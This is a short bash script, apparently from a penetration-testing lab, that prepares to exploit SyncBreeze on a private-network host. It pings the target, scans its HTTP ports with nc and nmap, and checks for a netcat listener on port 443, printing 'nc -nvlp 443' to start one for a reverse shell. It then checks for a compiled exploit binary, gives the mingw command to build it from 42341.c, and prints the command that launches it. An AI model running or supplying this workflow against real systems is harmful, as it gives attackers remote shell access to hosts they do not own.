#!/bin/bash

echo "=== SyncBreeze Exploit Test ==="
echo ""

# Check target
echo "[1] Testing connectivity to target..."
if ping -c 1 192.168.165.10 &>/dev/null; then
    echo "✓ Target is reachable"
else
    echo "✗ Target is NOT reachable"
    exit 1
fi

# Check port
echo "[2] Testing port 80..."
if nc -zv 192.168.165.10 80 2>&1 | grep -q "succeeded"; then
    echo "✓ Port 80 is open"
else
    echo "✗ Port 80 is NOT open"
    echo "  Checking other HTTP ports..."
    nmap -p 80,443,8080 192.168.165.10 -Pn
    exit 1
fi

# Check listener
echo "[3] Checking for netcat listener on port 443..."
if ss -tlnp | grep -q ":443"; then
    echo "✓ Listener is running on port 443"
else
    echo "✗ No listener on port 443"
    echo "  Start with: nc -nvlp 443"
fi

# Check exploit compiled
echo "[4] Checking exploit binary..."
if [ -f "syncbreeze_exploit.exe" ]; then
    echo "✓ Exploit binary exists"
else
    echo "✗ Exploit not compiled"
    echo "  Compile with: i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32"
    exit 1
fi

echo ""
echo "=== Ready to exploit ==="
echo "Run: sudo wine syncbreeze_exploit.exe"
echo ""
